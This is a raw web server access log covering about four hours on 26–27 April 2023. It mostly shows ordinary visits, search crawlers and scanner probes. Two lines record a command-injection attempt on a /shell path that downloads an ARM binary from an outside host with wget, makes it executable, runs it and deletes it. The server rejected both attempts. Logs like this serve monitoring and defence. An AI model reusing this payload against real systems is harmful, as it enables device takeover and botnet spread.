167.172.112.34 - - [26/Apr/2023:22:07:07 +0300] "GET / HTTP/1.1" 200 22585 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
167.172.112.34 - - [26/Apr/2023:22:07:20 +0300] "GET /favicon.ico HTTP/1.1" 404 491 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
167.172.112.34 - - [26/Apr/2023:22:08:19 +0300] "GET / HTTP/1.0" 200 75636 "-" "-"
37.220.79.196 - - [26/Apr/2023:22:51:01 +0300] "GET / HTTP/1.1" 200 76616 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
193.35.18.251 - - [26/Apr/2023:22:52:35 +0300] "POST /boaform/admin/formLogin HTTP/1.1" 404 491 "http://37.220.87.22:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
37.220.152.59 - - [26/Apr/2023:23:10:05 +0300] "GET / HTTP/1.1" 200 76619 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
198.235.24.108 - - [26/Apr/2023:23:11:22 +0300] "\x16\x03\x01" 400 486 "-" "-"
193.32.162.159 - - [26/Apr/2023:23:18:49 +0300] "GET / HTTP/1.1" 200 22844 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
1.233.206.27 - - [26/Apr/2023:23:57:56 +0300] "GET /shell?cd+/tmp;+wget+http:/\\/196.196.196.2/YourName/BinName.arm;+chmod+777+BinName.arm;+./BinName.arm Jaws.Selfrep;rm+-rf+BinName.arm" 400 486 "-" "-"
134.122.184.20 - - [26/Apr/2023:23:58:46 +0300] "GET /guocanju/huanchengdvdban/ HTTP/1.1" 404 493 "/guocanju/huanchengdvdban/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
40.113.118.83 - - [26/Apr/2023:23:59:26 +0300] "GET /an7jd0qo6kt5bk5bq4er8fe1xp7hl2vk/sqlite3.dll HTTP/1.1" 404 454 "-" "Go-http-client/1.1"
1.233.206.27 - - [27/Apr/2023:00:40:45 +0300] "GET /shell?cd+/tmp;+wget+http:/\\/196.196.196.2/YourName/BinName.arm;+chmod+777+BinName.arm;+./BinName.arm Jaws.Selfrep;rm+-rf+BinName.arm" 400 486 "-" "-"
87.236.176.101 - - [27/Apr/2023:00:46:16 +0300] "GET / HTTP/1.1" 200 22489 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
185.180.143.79 - - [27/Apr/2023:00:57:43 +0300] "GET / HTTP/1.1" 200 22474 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
35.203.255.124 - - [27/Apr/2023:01:11:09 +0300] "HEAD / HTTP/1.1" 200 184 "http://37.220.87.22" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36"
35.203.255.124 - - [27/Apr/2023:01:11:09 +0300] "GET / HTTP/1.1" 200 22891 "http://37.220.87.22" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36"
3.143.3.81 - - [27/Apr/2023:01:11:09 +0300] "GET / HTTP/1.1" 200 22505 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.43"
34.221.24.209 - - [27/Apr/2023:01:11:10 +0300] "GET / HTTP/1.1" 200 22507 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.43"
34.221.24.209 - - [27/Apr/2023:01:11:10 +0300] "GET / HTTP/1.1" 200 22503 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.43"
66.249.68.10 - - [27/Apr/2023:01:11:18 +0300] "GET /robots.txt HTTP/1.1" 404 491 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.68.10 - - [27/Apr/2023:01:11:18 +0300] "GET / HTTP/1.1" 200 22560 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.68.10 - - [27/Apr/2023:01:11:19 +0300] "GET / HTTP/1.1" 200 22741 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.68.18 - - [27/Apr/2023:01:11:21 +0300] "GET /favicon.ico HTTP/1.1" 404 491 "-" "Googlebot-Image/1.0"
192.241.218.48 - - [27/Apr/2023:01:11:53 +0300] "MGLNDD_37.220.87.22_80\n" 400 486 "-" "-"
87.236.176.164 - - [27/Apr/2023:01:13:04 +0300] "GET / HTTP/1.1" 200 22493 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
179.43.177.243 - - [27/Apr/2023:01:52:57 +0300] "GET / HTTP/1.1" 200 76117 "-" "Hello World"
193.32.162.159 - - [27/Apr/2023:01:53:07 +0300] "GET / HTTP/1.1" 200 22840 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
161.35.233.14 - - [27/Apr/2023:01:56:23 +0300] "GET /explore HTTP/1.1" 404 454 "-" "Mozilla/5.0 (Linux; Android 9; SM-G973U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
121.46.142.244 - - [27/Apr/2023:02:12:44 +0300] "GET / HTTP/1.1" 200 22603 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/68.0.3440.106 Chrome/68.0.3440.106 Safari/537.36"
